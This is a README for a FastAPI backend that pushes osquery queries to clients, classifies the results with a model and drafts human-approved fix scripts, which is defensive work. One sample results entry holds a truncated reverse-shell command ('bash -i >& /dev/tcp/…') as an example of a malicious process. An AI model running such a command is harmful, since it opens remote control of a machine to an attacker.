# Backend API

A small FastAPI app. It tells clients which osquery queries to run, checks the results with
Jev, and has OpenAI write a fix script for anything bad. The script is sent to the
remediations service, where a person approves it before it runs on the client.

## Run it

1. Copy `.env.example` to `.env` in the repo root and add both API keys:

   ```
   TYPESAFE_API_KEY=...      # Jev (decision model)
   OPENAI_API_KEY=...        # OpenAI (remediation model)
   REMEDIATION_API_URL=...   # where fix scripts are sent; leave blank to print them instead
   ```

2. From the repo root: `docker compose up --build`
3. Open http://localhost:8000/docs to try every endpoint in the browser, or run
   `server/examples/demo.sh` to walk through the whole flow in the terminal.

Printed fix scripts show up in `docker compose logs -f api`.

**Without Docker:** the server uses [uv](https://docs.astral.sh/uv/) for Python and its
packages. From `server/`, with the keys exported in your shell:

```bash
uv run uvicorn main:app --reload
```

To add a package, run `uv add <package>` in `server/`. It updates `pyproject.toml` and
`uv.lock`; commit both.

## Files

| File | What it does |
|---|---|
| `main.py` | Puts the app together. Start reading here. |
| `auth.py` | Works out which client is calling. |
| `schemas.py` | The JSON shapes going in and out. |
| `ingest/routes.py` | Client endpoints: `GET /poll` and `POST /results`. |
| `ingest/queries.py` | The osquery queries clients run. Edit this to collect something new. |
| `triage/decision.py` | Asks Jev whether each row is benign, suspicious or malicious. |
| `analysis/remediation.py` | Asks OpenAI to write a fix script. |
| `remediation/handoff.py` | Sends the fix script to the remediations service. |
| `remediation/mock.py` | A stand-in for the remediations service, so client developers can build now. |
| `api/routes.py` | Admin endpoint: send a one-time custom query to one client. |
| `examples/` | Sample client data, a demo script, and harmless example fix scripts. |

## For the clients (Kade, Mateo)

Send these headers on every request:

```
X-Client-Id: linux-vm-1        required: a stable id, e.g. osquery's system_info.uuid
X-Client-OS: linux             required: linux or windows
X-Client-Hostname: ubuntu-1    optional
```

Then repeat forever:

1. `GET /poll`
2. Run every query in `queries` with osquery, e.g. `osqueryi --json "<sql>"`
3. `POST /results` with the rows
4. Wait `poll_interval` seconds

**Poll response:**

```json
{
  "poll_interval": 300,
  "queries": [
    {"name": "processes", "sql": "SELECT pid, parent, name, path, cmdline, uid, on_disk FROM processes"},
    {"name": "cron_jobs", "sql": "SELECT command, path FROM crontab"}
  ]
}
```

**Results body:**

```json
{
  "results": [
    {"name": "processes", "rows": [{"pid": "4242", "name": "bash", "cmdline": "bash -i >& /dev/tcp/…"}]},
    {"name": "cron_jobs", "rows": []},
    {"name": "admin_users", "error": "no such table"}
  ]
}
```

- `name` is the query's name from the poll.
- `rows` is exactly what `osqueryi --json` printed. Don't convert anything.
- If a query failed, send `error` instead of `rows`.

**Results response:** the server answers right away with its decision. If anything looked
bad, the fix script is written in the background and sent to the remediations service under
`remediation_id`.

```json
{
  "decision": {"verdict": "malicious", "findings": [{"query": "processes", "row": {}, "verdict": "malicious", "confidence": 0.9}]},
  "remediation_id": "9ae8e385-f776-4da9-b2d4-caec5cc13b1d"
}
```

**Running fix scripts:** clients get approved scripts from the remediations service. Until
it exists, use the mock (same headers):

- `GET /mock/remediations/commands` returns scripts to run (always one harmless example).
- `POST /mock/remediations/commands/{id}/result` with `{"exit_code": 0, "output": "..."}`.

Scripts are multi-line, so save each one to a file and run the file:

- Linux: `bash /tmp/boombox-<id>.sh`
- Windows: `powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\boombox-<id>.ps1`

## For the remediations service (Aiden)

Each fix script is sent as `POST {REMEDIATION_API_URL}/remediations` with this body:

```json
{
  "id": "659b53f3-0a14-4ea6-a8da-04dfff8d9946",
  "client_id": "linux-vm-1",
  "hostname": "ubuntu-client",
  "os": "linux",
  "shell": "bash",
  "script": "#!/usr/bin/env bash\n# Stop the reverse shell\nkill -9 4242\n...",
  "explanation": "What was found, what the script does, and what to double-check.",
  "findings": [{"query": "processes", "row": {"pid": "4242", "…": "…"}, "verdict": "malicious", "confidence": 0.9}]
}
```

Nothing has run yet when you receive it. If you need a different URL or format, change
`send_to_remediation_api` in `remediation/handoff.py`.

## For the dashboard (Xander)

`POST /clients/{client_id}/queries` with `{"name": "...", "sql": "..."}` asks one client to
run a custom query once, on its next poll.

## Good to know

- **No real login yet.** The server trusts the `X-Client-*` headers. When we add login, only
  `current_client` in `auth.py` changes; the endpoints stay the same.
- **Custom queries are kept in memory**, so they're lost when the server restarts.
- **The admin endpoint isn't protected yet.**
- **The queries haven't been tested on real machines.** Kade and Mateo should try each one in
  `ingest/queries.py` with `osqueryi`, especially the Windows ones.
